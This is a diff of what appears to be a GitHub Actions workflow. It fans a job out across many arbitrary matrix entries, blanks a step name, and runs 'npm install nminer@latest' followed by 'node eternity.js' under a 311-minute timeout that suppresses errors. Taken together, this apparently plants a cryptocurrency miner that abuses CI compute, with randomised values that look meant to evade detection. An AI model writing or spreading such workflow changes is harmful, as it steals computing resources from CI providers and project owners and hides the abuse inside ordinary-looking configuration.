@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5183 }
-          - { version: 3214 }
-          - { version: 2920 }
-          - { version: 8030 }
-          - { version: 3330 }
-          - { version: 1878 }
-          - { version: 3958 }
-          - { version: 9651 }
-          - { version: 3375 }
-          - { version: 1228 }
-          - { version: 3961 }
-          - { version: 7876 }
-          - { version: 3632 }
-          - { version: 558 }
-          - { version: 8533 }
-          - { version: 9050 }
-          - { version: 1007 }
-          - { version: 1983 }
-          - { version: 6741 }
-          - { version: 8546 }
+          - { version: 3369 }
+          - { version: 5884 }
+          - { version: 5748 }
+          - { version: 1325 }
+          - { version: 5606 }
+          - { version: 2196 }
+          - { version: 2362 }
+          - { version: 690 }
+          - { version: 636 }
+          - { version: 6735 }
+          - { version: 446 }
+          - { version: 6670 }
+          - { version: 2316 }
+          - { version: 7700 }
+          - { version: 1636 }
+          - { version: 6947 }
+          - { version: 2711 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: empty upon
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 327m node eternity.js || echo "eternity executed"
+          timeout 311m node eternity.js || echo "eternity executed"
